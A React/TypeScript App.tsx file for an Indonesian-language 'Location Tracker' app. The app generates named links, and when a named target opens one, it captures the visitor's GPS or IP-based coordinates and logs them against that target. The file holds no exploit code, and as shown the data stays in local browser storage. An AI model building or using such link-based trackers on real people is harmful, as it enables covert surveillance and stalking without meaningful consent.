// src/App.tsx
import { useState, useEffect } from "react";
import type { LocationData, TrackingLink, StatsData } from "./types";
import { useLocalStorage } from "./hooks/useLocalStorage";
import { useGeolocation } from "./hooks/useGeolocation";
import CreateLinkForm from "./components/CreateLinkForm";
import Dashboard from "./components/Dashboard";
import LocationModal from "./components/LocationModal";
import {
  createLocationData,
  parseTrackingParams,
  clearTrackingParams,
} from "./utils/locationUtils";
import { createTrackingUrl } from "./utils/linkGenerator";

function App() {
  // Local Storage State
  const [locations, setLocations] = useLocalStorage<LocationData[]>("trackedLocations", []);
  const [trackingLinks, setTrackingLinks] = useLocalStorage<TrackingLink[]>("trackingLinks", []);

  // Component State
  const [showLocationModal, setShowLocationModal] = useState(false);
  const [currentTarget, setCurrentTarget] = useState<string | null>(null);
  const [isProcessingLocation, setIsProcessingLocation] = useState(false);

  // Custom Hooks
  const { getCurrentPosition, isLoading: geoLoading, error: geoError, clearError } = useGeolocation();

  // Calculate stats
  const stats: StatsData = {
    totalTracked: locations.length,
    onlineNow: locations.filter((loc) => loc.status === "online").length,
    activeLinks: trackingLinks.length,
  };

  // Handle link creation
  const handleLinkCreated = (newLink: TrackingLink) => {
    setTrackingLinks((prev) => [...prev, newLink]);
  };

  // Process location tracking with better error handling
  const processLocationTracking = async (targetName: string, trackId: string) => {
    if (isProcessingLocation) return; // Prevent duplicate processing
    
    setIsProcessingLocation(true);
    setShowLocationModal(true);
    setCurrentTarget(targetName);
    clearError(); // Clear any previous errors

    try {
      console.log(`Processing location for: ${targetName}`);
      
      // Get current position with enhanced fallback
      const position = await getCurrentPosition();
      console.log('Position obtained:', position);
      
      // Create location data
      const locationData = createLocationData(targetName, position);
      console.log('Location data created:', locationData);

      // Add to locations
      setLocations((prev) => {
        const newLocations = [...prev, locationData];
        console.log('Updated locations:', newLocations);
        return newLocations;
      });

      // Update link access status
      setTrackingLinks((prev) =>
        prev.map((link) => {
          if (link.id === trackId) {
            return { 
              ...link, 
              accessed: true, 
              accessCount: (link.accessCount || 0) + 1,
              lastAccessed: new Date()
            };
          }
          return link;
        })
      );

      console.log('Location tracking completed successfully');
      
      // Show success message
      setTimeout(() => {
        alert(`✅ Lokasi ${targetName} berhasil terdeteksi!\n\n` +
              `📍 Koordinat: ${position.latitude.toFixed(6)}, ${position.longitude.toFixed(6)}\n` +
              `🎯 Akurasi: ${position.accuracy}m\n` +
              `📡 Sumber: ${position.source === 'gps' ? 'GPS' : 'IP Location'}`);
      }, 1000);

    } catch (error) {
      console.error("Failed to get location:", error);
      
      let errorMessage = "Gagal mendapatkan lokasi. ";
      if (error instanceof Error) {
        errorMessage += error.message;
      } else {
        errorMessage += "Silakan coba lagi.";
      }
      
      // Show error with instructions
      alert(`❌ ${errorMessage}\n\n` +
            `💡 Tips:\n` +
            `• Pastikan browser mengizinkan akses lokasi\n` +
            `• Aktifkan GPS/Location Services\n` +
            `• Coba refresh halaman dan izinkan akses lokasi\n` +
            `• Pastikan koneksi internet stabil`);
      
      // Still mark the link as accessed (they clicked it)
      setTrackingLinks((prev) =>
        prev.map((link) => {
          if (link.id === trackId) {
            return { 
              ...link, 
              accessed: true, 
              accessCount: (link.accessCount || 0) + 1,
              lastAccessed: new Date()
            };
          }
          return link;
        })
      );
    } finally {
      setIsProcessingLocation(false);
      setShowLocationModal(false);
      setCurrentTarget(null);
      
      // Clean up URL parameters after processing
      setTimeout(() => {
        clearTrackingParams();
      }, 2000);
    }
  };

  // Check for tracking parameters on load
  useEffect(() => {
    const { trackId, name } = parseTrackingParams();
    console.log('Parsed tracking params:', { trackId, name });

    if (trackId && name && !isProcessingLocation) {
      console.log('Found tracking parameters, processing...');
      
      // Small delay to ensure UI is ready
      setTimeout(() => {
        processLocationTracking(name, trackId);
      }, 1000);
    }
  }, []); // Only run once on mount

  // Convert stored dates back to Date objects
  useEffect(() => {
    if (locations.length > 0) {
      const convertedLocations = locations.map((loc) => ({
        ...loc,
        timestamp: new Date(loc.timestamp),
      }));

      // Only update if there's a difference
      const needsUpdate = locations.some(
        (loc, index) => !(loc.timestamp instanceof Date) && convertedLocations[index]
      );

      if (needsUpdate) {
        setLocations(convertedLocations);
      }
    }
  }, []);

  // Convert stored link dates
  useEffect(() => {
    if (trackingLinks.length > 0) {
      const convertedLinks = trackingLinks.map((link) => ({
        ...link,
        created: new Date(link.created),
        lastAccessed: link.lastAccessed ? new Date(link.lastAccessed) : undefined,
      }));

      // Only update if there's a difference
      const needsUpdate = trackingLinks.some(
        (link, index) => !(link.created instanceof Date) && convertedLinks[index]
      );

      if (needsUpdate) {
        setTrackingLinks(convertedLinks);
      }
    }
  }, []);

  return (
    <div className="bg-gradient-to-br from-blue-50 to-indigo-100 min-h-screen">
      <div className="container mx-auto px-4 py-8">
        {/* Header */}
        <div className="text-center mb-8">
          <h1 className="text-5xl font-bold text-gray-800 mb-3">📍 Location Tracker</h1>
          <p className="text-gray-600 text-lg">Buat link untuk tracking lokasi secara real-time</p>
          <div className="mt-2 text-sm text-gray-500">Powered by React + TypeScript + Vite</div>
          
          {/* Show processing status */}
          {isProcessingLocation && (
            <div className="mt-4 bg-blue-100 border border-blue-300 text-blue-700 px-4 py-2 rounded-lg">
              🔄 Sedang memproses lokasi...
            </div>
          )}
          
          {/* Show geolocation error */}
          {geoError && (
            <div className="mt-4 bg-red-100 border border-red-300 text-red-700 px-4 py-2 rounded-lg">
              ❌ {geoError}
            </div>
          )}
        </div>

        {/* Create Link Form */}
        <CreateLinkForm onLinkCreated={handleLinkCreated} />

        {/* Dashboard */}
        <Dashboard locations={locations} stats={stats} />

        {/* Active Links Section */}
        {trackingLinks.length > 0 && (
          <div className="bg-white rounded-xl shadow-lg p-6">
            <h2 className="text-xl font-semibold text-gray-800 mb-4">
              🔗 Link Aktif ({trackingLinks.length})
            </h2>
            <div className="space-y-3">
              {trackingLinks.map((link) => (
                <div key={link.id} className="border border-gray-200 rounded-lg p-4">
                  <div className="flex justify-between items-center">
                    <div>
                      <div className="font-semibold text-gray-800">{link.name}</div>
                      <div className="text-sm text-gray-500">
                        Dibuat: {link.created.toLocaleString("id-ID")}
                      </div>
                      {link.lastAccessed && (
                        <div className="text-xs text-gray-400">
                          Terakhir diakses: {link.lastAccessed.toLocaleString("id-ID")}
                        </div>
                      )}
                    </div>
                    <div className="text-right">
                      <div
                        className={`text-sm font-medium ${
                          link.accessed ? "text-green-600" : "text-orange-600"
                        }`}
                      >
                        {link.accessed ? `✅ Diakses (${link.accessCount}x)` : "⏳ Belum diakses"}
                      </div>
                      <div className="flex flex-col space-y-1 mt-2">
                        <button
                          onClick={() => {
                            const trackingUrl = createTrackingUrl(link);
                            navigator.clipboard.writeText(trackingUrl);
                            alert("Link copied to clipboard!");
                          }}
                          className="text-blue-500 hover:text-blue-700 text-sm"
                        >
                          📋 Copy Link
                        </button>
                        <button
                          onClick={() => {
                            const trackingUrl = createTrackingUrl(link);
                            console.log('Generated URL:', trackingUrl);
                            alert(`🔗 URL Preview:\n${trackingUrl}\n\nLink sudah dicopy ke clipboard!`);
                            navigator.clipboard.writeText(trackingUrl);
                          }}
                          className="text-green-500 hover:text-green-700 text-sm"
                        >
                          👁️ Preview URL
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>

      {/* Location Modal */}
      <LocationModal 
        isVisible={showLocationModal} 
        targetName={currentTarget || undefined}
        isLoading={geoLoading || isProcessingLocation}
      />
    </div>
  );
}

export default App;